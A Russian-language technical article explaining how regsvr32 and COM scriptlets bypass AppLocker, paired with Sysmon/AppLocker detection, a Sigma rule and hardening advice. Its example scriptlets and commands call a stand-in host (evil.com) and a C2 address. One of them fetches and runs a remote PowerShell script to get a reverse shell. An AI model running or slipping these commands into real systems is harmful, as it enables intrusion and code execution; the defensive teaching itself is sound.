# Обход AppLocker через regsvr32 и подписанные бинарники: механизмы, детекция и защита

## Контекст и базовые понятия

AppLocker — это компонент системы контроля приложений (Application Control) в операционных системах Windows, предназначенный для управления выполнением исполняемых файлов, скриптов и установочных пакетов. В отличие от традиционных антивирусных решений, работающих по сигнатурному принципу, AppLocker реализует модель белого списка (whitelisting). Он блокирует выполнение любых файлов, не соответствующих заданным правилам, что существенно снижает поверхность атаки за счет предотвращения запуска несанкционированного ПО. Однако архитектура AppLocker, опирающаяся на доверие к цифровым подписям и путям файлов, создает уязвимости, связанные с легитимными системными утилитами.

Ключевым понятием в данном контексте является **Living Off The Land (LOTL)** или использование «бинарников, живущих на земле». Это тактика, при которой злоумышленники используют встроенные в ОС инструменты (LOLBins — Living Off The Land Binaries) для выполнения вредоносных действий, избегая обнаружения системами защиты, настроенными на поиск внешних вредоносных файлов. В рамках пост-эксплуатации, когда первичная точка входа уже получена, задача смещается с обхода периметра на выполнение задач (сбор данных, перемещение, повышение привилегий) без блокировки AppLocker.

Техника **Signed Binary Proxy Execution** (T1218 в таксономии MITRE ATT&CK) описывает использование подписанных исполняемых файлов для обхода политик контроля приложений. Подписанный бинарник, имеющий валидную цифровую подпись от Microsoft, автоматически проходит проверку AppLocker. Если злоумышленник может заставить такой бинарник выполнить произвольный код (через COM-объекты, скрипты или аргументы командной строки), политика AppLocker оказывается обойдена, так как система видит только легитимный процесс `regsvr32.exe`, а не скрытый в нем вредоносный скрипт.

Разграничение понятий:
*   **AppLocker Policy**: Набор правил, определяющих, кто и что может запускать. Правила могут быть основаны на пути (Path), издателе (Publisher) или хэше (Hash).
*   **LOLBins**: Легитимные исполняемые файлы (например, `regsvr32.exe`, `mshta.exe`, `certutil.exe`), которые могут быть использованы для выполнения кода.
*   **Signed Binary Proxy Execution**: Механизм, при котором легитимный бинарник выступает «прокси» для выполнения вредоносного кода.
*   **COM Scriptlet (.sct)**: Формат файла, содержащего XML-структуру с встроенным скриптом (JScript/VBScript), который может быть загружен и выполнен COM-объектами.

| Характеристика | AppLocker (Policy) | Signed Binary Proxy Execution (Technique) | LOTL (Concept) |
| :--- | :--- | :--- | :--- |
| **Суть** | Механизм контроля доступа (Whitelisting) | Метод обхода контроля через легитимные процессы | Парадигма использования системных инструментов |
| **Основа доверия** | Правила (Path/Publisher/Hash) | Цифровая подпись издателя (Microsoft) | Наличие в системе по умолчанию |
| **Цель атаки** | Обход ограничений на запуск | Выполнение произвольного кода в контексте доверенного процесса | Сокрытие активности в легитимном трафике |
| **Инструмент** | `applocker.exe`, GPO | `regsvr32.exe`, `mshta.exe`, `certutil.exe` | Любой LOLBin с подходящими аргументами |
| **Индикатор компрометации (IoC)** | Наличие правил блокировки | Необычные аргументы (`/i:`, `/u`) у системных утилит | Сетевые подключения из системных процессов |

Обход AppLocker через `regsvr32` является классическим примером Signed Binary Proxy Execution. `regsvr32.exe` (Microsoft Register Server) предназначен для регистрации DLL в реестре Windows. Однако его функционал включает возможность загрузки и выполнения COM-скриплетов (`.sct` файлов). Если злоумышленник предоставляет `regsvr32` URL на удаленный `.sct` файл, бинарник загружает его, парсит XML и выполняет встроенный скрипт (например, запуск `cmd.exe` или `powershell.exe`). Поскольку `regsvr32.exe` подписан Microsoft, AppLocker разрешает его выполнение, а последующий скрипт выполняется в контексте этого процесса, минуя проверку AppLocker на этапе запуска скрипта.

## Внутреннее устройство предмета

Механизм обхода AppLocker через `regsvr32` базируется на взаимодействии нескольких компонентов Windows: самого исполняемого файла `regsvr32.exe`, библиотеки `scrobj.dll` (Script Component Run-time Object) и COM-интерфейсов. Понимание внутренней архитектуры этого процесса необходимо для разработки эффективных правил детекции и защиты.

### Архитектура процесса `regsvr32` и `scrobj.dll`

`regsvr32.exe` является оболочкой (wrapper) для работы с COM-объектами. Его основная задача — вызов функций `DllRegisterServer` и `DllUnregisterServer` в загруженных DLL. Однако, если в качестве аргумента передается не DLL, а URL или путь к файлу с расширением `.sct`, `regsvr32` делегирует обработку библиотеке `scrobj.dll`.

`scrobj.dll` отвечает за парсинг и выполнение COM-скриплетов. Формат `.sct` представляет собой XML-документ, который содержит метаданные COM-объекта и встроенный скрипт (обычно JScript или VBScript). Когда `regsvr32` получает команду на регистрацию/отмену регистрации скрипта (через аргументы `/i:` или `/u:`), он вызывает функцию `CoGetObject` или аналогичные API, которые инициируют загрузку ресурса. Если ресурс доступен по HTTP/HTTPS, `regsvr32` использует встроенные механизмы WinHTTP для его загрузки.

Ключевой момент обхода заключается в том, что проверка AppLocker происходит только на этапе создания процесса. После того как `regsvr32.exe` запущен, он имеет право выполнять любые действия, разрешенные пользователю. Загрузка и выполнение скрипта из памяти или сетевого потока не вызывают новых проверок AppLocker, так как скрипт не является отдельным исполняемым файлом в контексте файловой системы, а обрабатывается как данные внутри легитимного процесса.

### Формат COM Scriptlet (.sct)

Файл `.sct` имеет строгую XML-структуру. Понимание этой структуры критично для написания правил детекции (например, YARA или Sigma), так как злоумышленники могут использовать обфускацию XML-тегов или атрибутов.

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration 
      progid="Test" 
      classid="{00000000-0000-0000-0000-000000000001}" >
      
    <!-- Ключевой элемент: описание скрипта -->
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami");
      ]]>
    </script>
    
    <!-- Описание методов регистрации/отмены регистрации -->
    <public>
      <method name="Exec"></method>
    </public>
    
    <!-- Описание интерфейсов -->
    <public interface name="Exec" type="idispinterface">
    </public interface>
    
  </registration>
</scriptlet>
```

В структуре `.sct` поле `<script>` содержит исполняемый код. Атрибут `language` указывает интерпретатор (JScript или VBScript). Блок `<![CDATA[ ... ]]>` используется для вставки кода, который не должен парситься как XML-теги. При выполнении `regsvr32 /i:<URL> scrobj.dll`, `scrobj.dll` загружает этот XML, извлекает содержимое `<![CDATA]]>`, компилирует его и выполняет в контексте вызывающего процесса.

### Механизм обхода AppLocker

Проверка AppLocker происходит на уровне ядра Windows через драйвер `APPID.SYS`. При попытке создать процесс ядро запрашивает у службы `AppIDSvc` (пользовательский режим) оценку политики. `AppIDSvc` проверяет путь, издателя или хэш файла.

1.  **Запуск процесса:** Пользователь (или скрипт) вызывает `regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll`.
2.  **Оценка AppLocker:** Ядро проверяет `regsvr32.exe`. Файл находится в `%SystemRoot%\System32`, подписан Microsoft. Правило AppLocker (по умолчанию разрешающее файлы из `System32` или подписанные Microsoft) разрешает выполнение.
3.  **Выполнение:** `regsvr32.exe` загружается в память.
4.  **Загрузка скрипта:** `regsvr32` инициализирует `scrobj.dll`. `scrobj.dll` делает HTTP-запрос к `evil.com`.
5.  **Выполнение скрипта:** Полученный `.sct` парсится. Встроенный JScript/VBScript выполняется.
6.  **Результат:** Код выполняется с привилегиями текущего пользователя. Если текущий пользователь имеет права на запуск PowerShell, то `powershell.exe` будет запущен легитимным процессом `regsvr32.exe`, и AppLocker не заблокирует его, так как проверка уже пройдена.

### Индикаторы наличия (IoC) и особенности

*   **Отсутствие записи в реестр:** Несмотря на название, `regsvr32` с аргументом `/i:` и URL не обязательно записывает что-либо в реестр. Он выполняет скрипт в памяти.
*   **Сетевая активность:** `regsvr32.exe` инициирует исходящие HTTP/HTTPS соединения. Это один из самых надежных индикаторов.
*   **Аргументы командной строки:** Наличие `/i:` (install), `/u:` (unregister), `/n:` (no manifest) является сильным индикатором аномалии.
*   **Вложенные процессы:** Появление дочерних процессов (`cmd.exe`, `powershell.exe`, `certutil.exe`) от `regsvr32.exe` является критическим индикатором.

| Компонент | Роль в механизме обхода | Индикаторы аномалии |
| :--- | :--- | :--- |
| `regsvr32.exe` | Исполняемая оболочка, доверенный бинарник | Запуск с аргументами `/i:`, `/u:`, `/n:` |
| `scrobj.dll` | Парсер и исполняющий движок COM-скриптов | Загрузка из памяти, отсутствие на диске (если скрипт удален) |
| `.sct` файл | Контейнер с вредоносным кодом | XML-структура с `<![CDATA[`, вызовы `ActiveXObject` |
| `WinHTTP` | Библиотека для сетевых запросов | Исходящие соединения из `regsvr32.exe` |
| AppLocker | Система контроля | Пропуск проверки для вложенных скриптов/процессов |

## Применение и работа с предметом

На практике работа с техникой обхода AppLocker через `regsvr32` включает этапы подготовки инфраструктуры (C2), создания полезной нагрузки (payload), развертывания скрипта и выполнения команды на цели. Для специалистов по информационной безопасности понимание этих шагов необходимо для настройки правил детекции и мониторинга.

### Подготовка инфраструктуры и скрипта

Для демонстрации техники требуется веб-сервер, отдающий `.sct` файл. Скрипт должен быть валидным XML и содержать код, который будет выполнен. В контексте тестирования на проникновение это часто запуск обратного шелла (reverse shell) или запуск PowerShell с параметром `-EncodedCommand`.

Пример структуры `.sct` файла для запуска PowerShell:

```xml
<?xml version="1.0"?>
<scriptlet>
<registration 
    progid="Scripting.Dictionary" 
    classid="{286E6F1B-7115-4544-92B8-24F4B26F339E}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell");
            // Запуск PowerShell с кодированной командой
            r.run("powershell.exe -nop -w hidden -e <BASE64_ENCODED_COMMAND>");
        ]]>
    </script>
</registration>
</scriptlet>
```

Злоумышленники могут использовать обфускацию XML (например, изменение регистра тегов, добавление пробелов) или кодирование скрипта для обхода простых текстовых правил детекции.

### Выполнение на цели

Команда для запуска обхода выглядит следующим образом:

```bash
regsvr32 /s /n /u /i:http://<C2_SERVER>/payload.sct scrobj.dll
```

*   `/s`: Silent mode (без вывода сообщений об ошибках).
*   `/n`: Не загружать манифест (необязательно, но часто используется для упрощения).
*   `/u`: Вызвать `DllUnregisterServer` (в контексте скрипта это триггер для выполнения кода).
*   `/i:<URL>`: Указывает URL или путь к файлу, который будет загружен и выполнен.
*   `scrobj.dll`: Библиотека, которая будет загружена и обработана.

Эта команда может быть выполнена из командной строки, PowerShell, VBS-скрипта или даже из браузера (через ActiveX, если разрешен).

### Детекция и защита

Для детекции этой техники используются несколько подходов:

1.  **Мониторинг событий Windows:**
    *   **Event ID 4688 (Process Creation):** Поиск дочерних процессов `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe` от `regsvr32.exe`.
    *   **Event ID 8002/8003 (AppLocker):** Если AppLocker настроен в режиме аудита, он может логировать попытки выполнения скриптов, хотя сам обypass может не быть заблокирован, если правила разрешают `regsvr32`.
    *   **Sysmon Event ID 1:** Детализированный лог создания процессов с аргументами командной строки.

2.  **Сетевой мониторинг:**
    *   Выявление исходящих HTTP/HTTPS соединений от `regsvr32.exe`. Легитимное использование `regsvr32` для загрузки скриптов из интернета крайне маловероятно.

3.  **Правила детекции (Sigma/YARA):**

    Пример правила Sigma для детекции запуска `regsvr32` с аргументом `/i:`:

    ```yaml
    title: AppLocker Bypass via Regsvr32
    id: 12345678-1234-1234-1234-123456789012
    status: experimental
    description: Detects the use of regsvr32 to execute remote scripts, bypassing AppLocker.
    references:
        - https://attack.mitre.org/techniques/T1218/010/
    logsource:
        category: process_creation
        product: windows
    detection:
        selection:
            Image: '\regsvr32.exe'
            CommandLine: '* /i:*'
        condition: selection
    falsepositives:
        - Unknown
    level: high
    ```

4.  **Меры защиты:**
    *   **Блокировка LOLBins:** Добавление правил AppLocker/WDAC, запрещающих выполнение `regsvr32.exe` из любых папок, кроме системных, или полный запрет на его использование, если оно не требуется.
    *   **Attack Surface Reduction (ASR):** Правила ASR в Microsoft Defender могут блокировать выполнение скриптов из `regsvr32.exe`.
    *   **Сетевые фильтры:** Блокировка исходящих HTTP/HTTPS соединений от системных утилит на межсетевом экране.
    *   **Политика выполнения скриптов:** Отключение Windows Script Host (WSH) или ограничение выполнения JScript/VBScript.

### Типичные ошибки и подводные камни

*   **Неверное понимание AppLocker:** AppLocker не блокирует скрипты, выполняемые внутри разрешенных процессов. Он контролирует только запуск файлов.
*   **Игнорирование сетевого трафика:** Фокусировка только на логах процессов без анализа сетевого контекста приводит к пропуску атак, где скрипт загружается из памяти или кэша.
*   **Неполное покрытие LOLBins:** Защита только `regsvr32` без учета других LOLBins (`mshta`, `certutil`, `bitsadmin`) оставляет лазейки для атакующих.

## Сквозной практический пример: Обход AppLocker через regsvr32

**Исходные условия:**
*   **Среда:** Windows 10 Enterprise с включенным AppLocker в режиме Enforcement.
*   **Правила AppLocker:** Разрешено выполнение всех файлов из `%WINDIR%` и `%PROGRAMFILES%`, а также всех файлов, подписанных Microsoft.
*   **Роль:** Пентестер, имеющий доступ к командной строке на скомпрометированной машине.
*   **Цель:** Запуск обратного шелла (reverse shell) на C2-сервер, обойдя AppLocker.
*   **Инструменты:** Веб-сервер с `.sct` файлом, `regsvr32.exe`.

### Шаг 1: Подготовка полезной нагрузки (Payload)

Создаем `.sct` файл, который при выполнении запустит PowerShell с обратным шеллом. Для примера используется простой JScript, запускающий `cmd.exe`. В реальном сценарии здесь был бы кодированный PowerShell-команда.

```xml
<!-- payload.sct -->
<?xml version="1.0"?>
<scriptlet>
<registration 
    progid="TestScriptlet" 
    classid="{A8F5C3D1-2B4E-4F6A-8C9D-0E1F2A3B4C5D}" >
    <script language="JScript">
        <![CDATA[
            var shell = new ActiveXObject("WScript.Shell");
            // Запуск cmd.exe с обратным шеллом (пример)
            shell.run("cmd.exe /c powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.100:8080/payload.ps1\")'");
        ]]>
    </script>
</registration>
</scriptlet>
```

### Шаг 2: Развертывание скрипта на C2-сервере

Веб-сервер (например, Python HTTP Server) раздает `.sct` файл по адресу `http://192.168.1.100:8080/payload.sct`.

```bash
# На C2-сервере
python3 -m http.server 8080
```

### Шаг 3: Выполнение команды на цели

На скомпрометированной машине выполняется команда `regsvr32` с указанием URL на `.sct` файл.

```powershell
# На цели
regsvr32 /s /n /u /i:http://192.168.1.100:8080/payload.sct scrobj.dll
```

### Шаг 4: Анализ событий (Детекция)

Специалист по SOC анализирует логи Sysmon и AppLocker.

**Sysmon Event ID 1 (Process Creation):**
```json
{
  "EventID": 1,
  "Image": "C:\\Windows\\System32\\regsvr32.exe",
  "CommandLine": "regsvr32 /s /n /u /i:http://192.168.1.100:8080/payload.sct scrobj.dll",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe"
}
```

**Сетевой трафик:**
На межсетевом экране фиксируется исходящее HTTP-соединение от `regsvr32.exe` к `192.168.1.100`.

**AppLocker Event ID 8002 (Audit Mode):**
Если AppLocker в режиме аудита, может быть записано событие о попытке выполнения скрипта, но так как `regsvr32` разрешен, блокировки не происходит.

### Шаг 5: Результат

`regsvr32.exe` загружает `.sct` файл, `scrobj.dll` парсит его и выполняет JScript. JScript запускает `powershell.exe`, который загружает и выполняет вредоносный скрипт. AppLocker не блокирует процесс, так как `regsvr32.exe` является легитимным и подписанным файлом. Обратный шелл устанавливается, и пентестер получает доступ к системе.

**Ожидаемый вывод:**
Пример демонстрирует, как легитимный системный бинарник может быть использован для выполнения произвольного кода, обходя политики контроля приложений. Ключевыми индикаторами являются аргументы командной строки `regsvr32` и сетевая активность из системного процесса.

## Аналитический вывод

Обход AppLocker через `regsvr32` и другие подписанные бинарники представляет собой серьезную угрозу для инфраструктур, полагающихся исключительно на модели белого списка для защиты от вредоносного ПО. Эта техника, классифицируемая как Signed Binary Proxy Execution (T1218), эксплуатирует фундаментальное доверие операционной системы к цифровым подписям Microsoft и легитимным системным утилитам. Ключевая уязвимость заключается в том, что AppLocker контролирует запуск исполняемых файлов, но не имеет встроенных механизмов для глубокого анализа поведения процессов или блокировки выполнения скриптов, загруженных в память легитимными процессами.

Эффективность атаки обусловлена несколькими факторами: отсутствием необходимости в создании вредоносных файлов, использованием доверенных бинарников, которые не вызывают подозрений у систем мониторинга, и возможностью загрузки полезной нагрузки из сети, что оставляет минимальный след на диске. Для защиты от таких атак необходимо применять многоуровневый подход: внедрение правил Attack Surface Reduction (ASR), мониторинг аномальной сетевой активности системных процессов, использование Windows Defender Application Control (WDAC) с более строгими политиками, а также ограничение выполнения скриптов и отключение ненужных функций, таких как Windows Script Host. Только комплексный анализ поведения (behavioral analytics) и сетевой контекст позволяют эффективно выявлять и предотвращать эксплуатацию LOLBins.
